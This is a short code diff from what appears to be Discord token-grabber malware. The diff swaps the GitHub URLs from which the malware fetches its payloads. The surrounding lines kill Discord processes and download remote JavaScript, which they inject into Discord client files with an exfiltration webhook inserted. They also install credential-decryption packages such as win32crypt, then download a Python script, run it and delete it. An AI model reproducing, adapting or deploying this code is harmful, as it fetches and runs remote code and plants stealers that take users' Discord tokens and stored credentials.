@@ -85,7 +85,7 @@ try {
                 rDiscord.forEach(d => {
                     exec(`taskkill /IM ${d}.exe /F`, err => {})
                 })
-                fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => {
+                fetch("https://raw.githubusercontent.com/kozune123/DISCORD_GRABBER/main/data/index.js").then(r => r.text()).then(r => {
                     inject.forEach(file => {
                         fs.writeFile(file, r.replace("*WEBHOOK*", webhook), err => {})
                         rDiscord.forEach(d => {
@@ -106,7 +106,7 @@ try {
     var RoaDirect = fs.readdirSync(process.env.APPDATA)
     if (RoaDirect.includes("Python")) {
         exec(`pip install discord-webhook, os, json, base64, sqlite3, win32crypt, Crypto.Cipher, shutil, datetime, discord_webhook`)
-        fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.py").then(r => r.text()).then(r => {
+        fetch("https://raw.githubusercontent.com/kozune123/DISCORD_GRABBER/main/data/index.py").then(r => r.text()).then(r => {
             fs.writeFile("./python.py", r.replace("*WEBHOOK*", webhook), err => {})
             exec("python python.py")
             setTimeout(() => exec(`del "./python.py"`), 1000)
